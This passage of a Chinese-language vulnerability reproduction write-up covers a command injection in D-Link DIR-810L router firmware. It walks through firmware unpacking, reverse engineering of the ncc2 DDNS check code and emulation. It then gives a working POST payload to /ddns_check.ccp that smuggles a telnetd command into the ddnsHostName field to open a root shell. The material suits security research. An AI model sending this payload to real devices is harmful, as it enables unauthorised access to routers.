#### 2.1 固件解包
使用binwalk解包，获取固件文件系统：
```bash
binwalk -Me DIR810LA1\_FW102B22.bin
```
![](upload/attach/202307/882513\_HZUCVH9655YMTHX.png)
![](upload/attach/202307/882513\_MZ8PHJDM8FBKWZN.png)
查看一下启动文件：
![](upload/attach/202307/882513\_G3TSXVQR8U76P99.png)
查看一下二进制文件，发现存在telnet、telnetd和wget可用于漏洞验证：
![](upload/attach/202307/882513\_HG7WKKUZMNRWVFM.png)
#### 2.2 文件分析
在漏洞描述中详细的说明漏洞存在于ncc2文件中的DDNS函数中，直接在文件系统中查找ncc2文件：
![](upload/attach/202307/882513\_SZN9YWKMTH6E5J8.png)
将sbin/ncc文件拿到IDA中分析，直接查找ddns函数，定位到关键函数并在doCheck函数中找到漏洞点：
![](upload/attach/202307/882513\_M7SKF2DYXJRYB5P.png)
上述代码含义为：判断ccp\_act的值是否为doCheck，若为doCheck则调用doCheck函数检查参数。
![](upload/attach/202307/882513\_F64YXS2XZPEDFRS.png)
查找`get\_entry\_value\_by\_name`和`\_\_system`函数的实现：
![](upload/attach/202307/882513\_CRCN3CW5V8RWWSD.png)
![](upload/attach/202307/882513\_92WMFK8CB4R5Z7S.png)
上述代码含义是：通过`get\_entry\_value\_by\_name`获取ddnsHostName、ddnsUsername、ddnsPassword的值并将其传入到`\_\_system`中拼接执行。在这个过程中并没有对从前端输入的数据进行过滤或者检查，因此导致了命令注入漏洞。ddnsHostName、ddnsUsername、ddnsPassword的值是通过ddns\_check.ccp传入。综上可知大概的payload如下：
```html
POST /ddns\_check.ccp HTTP/1.1
...
ccp\_act=doCheck&ddnsHostName=xxxx&ddnsUsername=xxxx&ddnsPassword=xxxx
```
### 0x03 漏洞复现
#### 3.1 模拟固件
使用FirmAE模拟固件：
![](upload/attach/202307/882513\_8UANUPU2HNPXR5D.png)
![](upload/attach/202307/882513\_4U5R64YQ3PF3VBH.png)
默认密码为空，直接登录即可。
#### 3.2 改包验证
登录后，抓包改包验证漏洞：
![](upload/attach/202307/882513\_8F8NAXJT3WW5ZAM.png)
```html
将GET /Home.html HTTP/1.1改为：
POST /ddns\_check.ccp HTTP/1.1
...
在包体中添加：
ccp\_act=doCheck&ddnsHostName=;/bin/telnetd -l /bin/sh -p 7080 -b 0.0.0.0;&ddnsUsername=xxxx&ddnsPassword=xxxx
```
复现成功，取得shell：
![](upload/attach/202307/882513\_4KE6ERQAQJ6BDS9.png)
### 0x04 复现总结
这个命令执行漏洞没有后台页面存在，是直接POST 数据到ddns\_check.ccp交给后端处理，处理好之后将结果返回给用户。因而比较隐蔽不容易被发现，需要通过逆向ncc2文件才能发现其端倪。感觉很奇怪，为什么要留一个不提供用户接口的ddns\_check功能，虽然在www文件夹下发现了一个DynamicDNS.html页面，并且ddns看命名也像是和动态dns有关，但是设置动态dns默认是关闭的并且文件中也没有向URL：/ddns\_check.ccp提交数据的代码。因此怀疑本漏洞所在功能是某个版本遗留功能。
